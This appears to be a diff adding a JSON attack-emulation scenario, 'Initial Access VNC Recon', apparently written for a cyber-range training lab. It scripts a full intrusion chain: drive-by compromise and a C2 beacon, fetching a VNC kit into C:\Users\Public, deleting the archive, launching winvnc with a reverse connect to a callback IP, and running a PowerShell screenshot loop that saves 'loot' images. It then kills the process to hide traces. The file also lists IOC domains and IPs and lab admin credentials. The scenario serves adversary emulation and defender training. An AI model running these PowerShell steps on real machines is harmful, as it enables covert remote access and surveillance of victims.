@@ -1,0 +1,472 @@
+{
+    "meta_data": {
+        "name": "vnc_recon",
+        "version": "v1.0.0",
+        "title": "Initial Access VNC Recon",
+        "description": "The cyber criminal underground can be abstracted into many different groups.",
+        "author": "Attack Content",
+        "suggested_duration": 600
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX2",
+            "preconditions": {
+                "payload": "vnc_recon_v1-kit.zip",
+                "driveby": "self.driveby2",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "Get-vnc-kit_t1_1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "file_store_server": "self.driveby_domain2",
+                    "file_name": "self.tool_name2",
+                    "output_directory": "C:\\Users\\Public",
+                    "output_file_name": "vnc-kit.zip"
+                }
+            }
+        },
+        {
+            "tactic": "DeobfuscateDecodeFilesOrInformation",
+            "technique": "DefenseEvasion",
+            "label": "Uncompress-kit_t1_2",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{Expand-Archive C:\\Users\\Public\\vnc-kit.zip -DestinationPath C:\\Users\\Public\\vnc-kit; echo 'Unzip Complete'}"
+                }
+            }
+        },
+        {
+            "tactic": "FileDeletionPowershell",
+            "technique": "DefenseEvasion",
+            "label": "FileDeletion_t1_3",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{Remove-Item C:\\Users\\Public\\vnc-kit.zip; echo 'Removed ZIP Tools'}"
+                }
+            }
+        },
+        {
+            "tactic": "RemoteAccessSoftware",
+            "technique": "c2",
+            "label": "Start-VNC_t1_4",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{Start-Process C:\\Users\\Public\\vnc-kit\\winvnc.exe; Start-sleep 5; C:\\Users\\Public\\vnc-kit\\winvnc.exe -connect ",
+                            {
+                                "kind": "slice",
+                                "slice": 0,
+                                "value": {
+                                    "kind": "call",
+                                    "func": {
+                                        "kind": "attribute",
+                                        "attr": "split",
+                                        "value": "self.tool_call_back_ip"
+                                    },
+                                    "args": [
+                                        "/",
+                                        1
+                                    ]
+                                }
+                            },
+                            "; echo 'Executed VNC Connect Back'; }"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "RemoteAccessSoftware",
+            "technique": "c2",
+            "label": "Recon-Box_t1_5",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{Start-Process C:\\Users\\Public\\vnc-kit\\vnc_recon.bat; echo 'Started BAT script'}"
+                }
+            }
+        },
+        {
+            "tactic": "ScreenCapture",
+            "technique": "Collection",
+            "label": "ScreenCapture_t1_6",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{[Reflection.Assembly]::LoadWithPartialName('System.Drawing');[void] [System.Reflection.Assembly]::LoadWithPartialName('System.Drawing');[void] [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');function screenshot($path){$width = 0;$height = 0;$workingAreaX = 0;$workingAreaY = 0;$screen = [System.Windows.Forms.Screen]::AllScreens;foreach ($item in $screen){if($workingAreaX -gt $item.WorkingArea.X){$workingAreaX = $item.WorkingArea.X;}if($workingAreaY -gt $item.WorkingArea.Y){$workingAreaY = $item.WorkingArea.Y;}$width = $width + $item.Bounds.Width;if($item.Bounds.Height -gt $height){$height = $item.Bounds.Height;}}$bounds = [Drawing.Rectangle]::FromLTRB($workingAreaX, $workingAreaY, $width, $height);$bmp = New-Object Drawing.Bitmap $width, $height;$graphics = [Drawing.Graphics]::FromImage($bmp);$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);$bmp.Save($path);$graphics.Dispose();$bmp.Dispose();}; $cnt=0; while($cnt -lt 6){screenshot \"c:\\Users\\Public\\vnc-kit\\vnc_loot_$(get-random).png\"; $cnt = $cnt+1; Start-Sleep 15;};echo 'Completed Multiple Screenshots'}"
+                }
+            }
+        },
+        {
+            "tactic": "HideArtifacts",
+            "technique": "DefenseEvasion",
+            "label": "Stop-VNC_t1_7",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{Stop-Process -name winvnc; echo 'Kill VNC process'}"
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "24hoursshops.com",
+            "adwoplok-investing.pro",
+            "city-ad.com",
+            "diaazulmgs.com",
+            "digitalnewstore.com",
+            "gangsteerallstar.com",
+            "jrnyyclub.xyz",
+            "lojasubimarino.com",
+            "ooc2.com",
+            "osfnft.xyz",
+            "rafagraassetti.xyz",
+            "restaruantemelucas.com",
+            "sabbet.xyz",
+            "simplyeverifacir.com",
+            "webkoubai.com"
+        ],
+        "ip": [
+            "117.50.187.119/24",
+            "139.5.88.14/24",
+            "177.144.27.137/24",
+            "177.54.14.4/24",
+            "185.150.18.135/24",
+            "185.150.19.21/24",
+            "185.196.2.54/24",
+            "188.120.229.207/24",
+            "192.162.246.62/24",
+            "192.162.255.12/24",
+            "219.117.246.99/24",
+            "31.192.233.135/24",
+            "39.15.129.56/24",
+            "40.97.85.147/24",
+            "92.87.6.124/24"
+        ],
+        "binary": [
+            "MonitorSrv.exe",
+            "TaskmanSrv.exe",
+            "TelemetryData.exe",
+            "WindowsME.exe",
+            "build_beta.exe",
+            "geolocate.exe",
+            "healthstatus.exe",
+            "kuiq.exe",
+            "mbtEC54.exe",
+            "myonedrive.exe",
+            "mysetup.exe",
+            "readme.exe",
+            "servicemonitor.exe",
+            "setup.exe",
+            "xmoon.exe"
+        ]
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "5",
+                "ioc-ip_callback": "122.49.215.108/24",
+                "ioc-domain_callback": "inform.bedircati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            },
+            "2": {
+                "name": "vnc_recon_v1-kit.zip"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "range": {
+            "query-ad_domain": "site.lan"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwaterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            },
+            "2": {
+                "ioc-ip_driveby": "157.32.19.24/24",
+                "ioc-domain_driveby": "arkansaspumps.us"
+            }
+        },
+        "targets": {
+            "1": {
+                "query-target_control_ip": "10.10.5.101",
+                "query-target_ip": "172.16.5.101",
+                "query-target_hostname": "dev-win10-1",
+                "payload_destination": "c:\\users\\Public",
+                "query-target_email": "Madelyn.Luna@site.com",
+                "query-domain_admin_username": "administrator",
+                "query-domain_admin_password": "Simspace1!Simspace1!"
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "tool_call_back_ip": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-ip_callback"
+                ]
+            },
+            "tool_name2": {
+                "path": [
+                    "tool",
+                    "2",
+                    "name"
+                ]
+            },
+            "range": {
+                "path": [
+                    "range"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby2": {
+                "path": [
+                    "driveby",
+                    "2"
+                ]
+            },
+            "driveby_domain2": {
+                "path": [
+                    "driveby",
+                    "2",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "phish_1": {
+                "path": [
+                    "phishing",
+                    "1"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "domain": {
+                "path": [
+                    "range",
+                    "query-ad_domain"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
